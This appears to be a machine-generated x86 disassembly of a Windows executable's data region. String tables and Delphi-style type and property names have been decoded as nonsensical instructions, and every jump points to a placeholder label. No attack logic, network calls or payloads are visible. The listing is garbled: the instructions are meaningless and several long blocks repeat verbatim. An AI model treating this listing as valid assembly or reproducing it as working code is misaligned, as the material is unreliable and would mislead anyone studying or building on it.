jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax ] bh
cmp [ eax + eax + 0x3c ] al
adc [ eax ] al
cmp al 0x10
inc eax
add al bh
cmp al [ eax + eax ]
adc [ eax ] al
nop
inc esp
inc ecx
inc esp
add [ eax ] cl
or al 0x54
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
pushfd
inc edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov [ edx + 0x44 ] al
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
cmp [ eax ] bh
inc esp
add ah bh
inc ecx
inc esp
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x444410c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ edi + eax * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x444288c0 ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ edi + eax * 2 + 0x4f740044 ] bl
inc esp
add [ eax ] al
adc [ eax ] al
mov al 0x41
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
adc [ esp + eax * 2 ] al
or [ esi ] dl
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x444388c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
inc ebp
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax ] al
aam 0x69
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ eax ] cl
lahf
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
jo r-xdata
add ah dl
imul eax [ ecx ] sub_420e84
int3
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + 0x3c004155 ] dl
adc [ eax ] al
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
clc
inc edx
inc esp
add [ eax ] cl
lea eax [ eax ]
sub [ ebp + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x47a00044 ] dh
inc esp
add [ eax ] al
jbe r-xdata
add [ edx + 0x5c004447 ] dl
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + 0x4155 ] dl
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test [ esp + eax * 2 ] al
or [ edx ] dl
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add ah cl
jl r-xdata
push eax
outsd
jae r-xdata
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
add al ch
stosd [ edi ]
inc esp
add al ah
lahf
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
add [ eax ] dh
jg r-xdata
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
jle r-xdata
add ah al
mov [ eax + eax - 0x4 ] al
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x7bf40042 ] ah
inc esp
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] bh
jle r-xdata
add [ eax + 0x1c004480 ] dh
nop
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebp + eax * 4 + 0x44 ] bh
sub_444668
inc esp
add ah al
mov eax [ 0xffffffffa2d40044 ]
inc esp
add [ ebx ] ah
inc esp
add al ah
mov eax [ 0xffffffffa2fc0044 ]
inc esp
add [ ebx + 0x44 ] cl
add [ ebx - 0x5b73ffbc ] ah
inc esp
add [ 0xffffffffa5240044 ] al
inc esp
add [ ebp + 0x44 ] al
add [ ebp - 0x5a23ffbc ] bl
inc esp
add [ esi - 0x594bffbc ] cl
inc esp
add [ esi - 0x593bffbc ] bh
inc esp
add ah al
cmpsd [ esi ] [ edi ]
inc esp
add ah dh
cmpsd [ esi ] [ edi ]
inc esp
add ah cl
cmpsb [ esi ] [ edi ]
inc esp
add [ edi - 0x51bfffbc ] bl
inc esp
add [ eax ] bl
test al 0x44
add [ eax ] ah
test al 0x44
add [ eax ] bh
test al 0x44
add [ eax - 0x58 ] dl
inc esp
add [ eax - 0x57 ] ch
inc esp
add [ edi + 0x44 ] bh
add ah bh
cmpsb [ esi ] [ edi ]
inc esp
add [ eax ] ah
cmpsd [ esi ] [ edi ]
inc esp
add [ esi + ebp * 4 + 0x44 ] ch
add al cl
test eax 0xadb40044
inc esp
add [ ecx + edx * 4 - 0x78efffbc ] al
inc esp
add [ eax ] dh
mov al [ 0xffffffff9ba00044 ]
inc esp
add [ eax - 0x6a4fffbc ] bl
inc esp
add ah dh
xchg ebx eax
inc esp
add [ edi + ebp * 4 - 0x6bf7ffbc ] dl
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ esp + edx * 4 ] dh
inc esp
add [ esp + edx * 4 + 0x44 ] dl
add [ eax ] bl
xchg ebp eax
inc esp
add [ ebp + edx * 4 + 0x44 ] ah
add [ eax - 0x6e ] ah
inc esp
add [ eax - 0x6e ] dh
inc esp
add al bh
xchg edx eax
inc esp
add al bl
xchg edx eax
inc esp
add ah bl
xchg esi eax
inc esp
add al dh
xchg esi eax
inc esp
add al ch
stosb [ edi ]
inc esp
add al dl
lodsb [ esi ]
inc esp
add [ eax + 0x3400447d ] cl
mov [ 0xffffffffa0bc0044 ] al
inc esp
add [ ebx + 0x44 ] dh
add [ esp ] bl
inc esp
add [ ebx + edx * 4 ] ah
inc esp
add al al
jge r-xdata
outsb
je r-xdata
add [ eax ] al
jg r-xdata
je r-xdata
outsd
insb
sub [ ebp + 0x44 ] al
add [ eax ] dl
jg r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
outsd
insb
jae r-xdata
add al dl
push 0x41
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x1bffbb83 ] bl
lea eax [ eax + eax + 0x70 ]
popfd
inc esp
add al bh
add [ eax + eax - 0x54 ] 0x92
inc esp
add [ ecx + edx * 4 ] dh
inc esp
add [ ebp + edi * 2 + 0x7d8c0044 ] dl
inc esp
add al bl
pop [ eax + eax + 0x50 ]
xchg ecx eax
inc esp
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
[ esp + eax * 4 + 0x44 ]
add [ eax - 0x55 ] dl
jae r-xdata
add [ fs : eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x4c
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add bh bh
call esp
add [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
insb
nop
mov al [ 0x7004447 ]
or [ ebx + eax * 2 + 0x6f ] dl
cmovb eax [ eax ]
add al 0x7b
inc esp
add [ eax ] ch
cmovb eax [ eax ]
mov esp 0x1000420f
adc [ edx ] al
inc esp
jns r-xdata
inc edx
add ah dl
scasd [ edi ]
add [ eax ] al
mov al [ 0xffffffffc0004439 ]
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
add [ eax + eax ] ah
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
push [ eax - 0x7c ]
inc esp
add [ eax - 0x55 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
xor al 0x40
outsd
outsb
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
pop esp
test [ eax + eax + 0x50 ] al
stosd [ edi ]
jb r-xdata
dec esp
add [ eax ] al
push r-xdata
adc [ eax ] al
inc esp
add [ eax ] al
dec [ eax + 0x1004482 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
add al al
jpe r-xdata
add ah al
push eax
inc ebp
add [ eax - 0x13ffbb87 ] bh
add [ ecx + ecx * 2 + 0x240044 ] dh
jns r-xdata
add [ edi + ecx + 0x10100042 ] bh
inc edx
add [ ecx + edi * 2 + 0x44 ] al
js r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
mov al 0x82
inc esp
add [ ecx ] al
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x30ff0000 ]
stosd [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
imul esp [ edi + 0x68 ] 0x4434a874
add [ eax ] bh
add bh bh
add [ ebp + 0x10044 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
push [ eax + 0x1004482 ]
or [ ecx + 0x6d ] ebp
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
add [ ecx + edx * 2 + 0x51a00045 ] bl
inc ebp
add ah ah
jpe r-xdata
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
add ah ch
jns r-xdata
inc esp
add [ edi + ecx + 0x7a580042 ] ah
inc esp
add al bl
outsd
jb r-xdata
push eax
inc ebp
add al bh
scasd [ edi ]
inc esp
add [ eax ] dh
jpo r-xdata
mov eax 0xec004479
cmp [ ecx + 0x44 ] cl
add [ eax ] al
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
insd
inc ebx
insb
outsd
jae r-xdata
add [ eax + edi * 2 + 0x44 ] dl
je r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x49d0c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add ah cl
dec ecx
inc esp
imul ebp [ esi + 0x43 ] 0x72746e6f
add [ ecx + edx * 2 ] bh
inc ebp
add [ eax + 0x51 ] dl
inc ebp
add [ edx + edi * 2 ] ah
inc esp
add [ eax + 0x51 ] bh
inc ebp
add [ eax - 0x7fffbb86 ] al
push ecx
inc ebp
add [ eax - 0x77ffbb86 ] ah
push ecx
inc ebp
add [ eax ] al
mov al 0x44
add [ ebx + edi * 2 + 0x7bd40044 ] dl
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
inc eax
test al 0x55
inc ecx
add [ eax + 0x1 ] bl
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
inc esp
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
dec edx
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add al dl
dec edx
inc esp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
dec edx
inc esp
add [ esi ] al
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
inc edx
outsd
jb r-xdata
inc esp
add [ ecx ] al
or al 0x54
or [ ebx + 0x6f ] al
outsb
je r-xdata
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600444a ] cl
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ ebx + ecx * 2 ] ch
inc esp
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
add eax edx
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
dec ebx
inc esp
dec ebx
inc esp
outsb
je r-xdata
outsd
insb
jae r-xdata
dec esp
inc esp
add [ esi + 0x4f ] ah
outsd
insb
jae r-xdata
mov eax eax
je r-xdata
outsb
je r-xdata
inc ebx
outsd
dec edx
inc esp
add [ ebx + 0x444b30c0 ] cl
ror [ edx + 0x44 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec esp
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
jo r-xdata
or cl [ eax ]
push esp
dec ecx
insd
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
aam 0x4a
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
shl [ eax + 0x4a ] 0x44
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
shl [ ebx + ecx * 2 + 0x44 ] 0x0
add [ ebx ] ecx
push esp
inc edx
jbe r-xdata
add bh bh
dec [ esp + ecx * 2 ]
inc esp
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x4ff7ffbe ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
outsd
insb
jae r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x17c0044 ] cl
add [ eax ] al
pop esp
dec edx
inc esp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc esp
add [ edx + eax ] al
add [ eax ] al
fadd [ esp + eax * 2 ]
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
dec di
insb
push edi
inc esp
add [ eax + 0x4f ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
add [ eax ] al
add [ eax ] al
aam 0x4c
sub_444b8b
rcl [ eax + 0xf00444b ] 0xc
dec ecx
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec esp
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x4ff7ffbe ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
outsd
insb
jae r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x17c0044 ] cl
add [ eax ] al
pop esp
dec edx
inc esp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
